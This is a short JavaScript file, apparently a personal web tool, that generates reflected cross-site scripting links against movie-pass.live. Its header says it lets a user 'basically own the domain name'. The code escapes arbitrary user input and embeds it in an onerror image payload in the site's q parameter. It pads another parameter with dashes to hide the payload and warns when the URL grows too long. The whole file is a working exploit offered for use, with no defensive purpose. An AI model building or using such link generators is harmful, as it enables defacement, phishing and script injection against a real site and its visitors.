/*
program.js by luphoria
luphoria.github.io

Designed to create URLS that will override movie-pass.live, allowing you to basically own the domain name.
*/

function convert(original) {
    a = original.replace(/"/g, '\\"'); //there has to be a faster way to do this.
    b = a.replace(/'/g, "\\'");
    c = b.replace(/`/g, "\\'");
    d = c.replace(/%/g, "\\%");
    e = encodeURI(d);
    console.log("Converted input: " + e);
    inputModified = e;
    return "function convert performed!";
}

function generate(binput,cidHide) {
        if(cidHide == true) {
            cidHideModified = "--------------------------------------------------------------------------------";
        }
        else {
            cidHideModified = "";
        }
    convert(binput);
    if (binput.includes("%" || '"')) {
        alert("Including '%' or '\"' is likely to break the tool. It will still generate, but be careful.");
    }
    var baseURL = "https://movie-pass.live/su/?s=xss&cid=" + cidHideModified + "&q=%3Cimg+src+onerror%3D%22document.write(`" + inputModified + "`)%22%3E%3C%2Fimg%3E&a=3&img=";
        if (baseURL.length > 2000) {
            if ("https://movie-pass.live/su/?s=xss&cid=&q=%3Cimg+src+onerror%3D%22document.write(`" + inputModified + "`)%22%3E%3C%2Fimg%3E&a=3&img=".length < 2000) { //checks length of baseURL without cidHide on.
                alert("URL too long! Try removing cid hide.");
            }
            else {
                alert("Too much code! Try instead referencing a URL with this code in it.");
            }
        }
        else {
            console.log("URL generated!\nGenerated url: \n\n " + baseURL);
            document.getElementById("OUTPUT").href = baseURL;
        }
    return "function generate performed!";
}
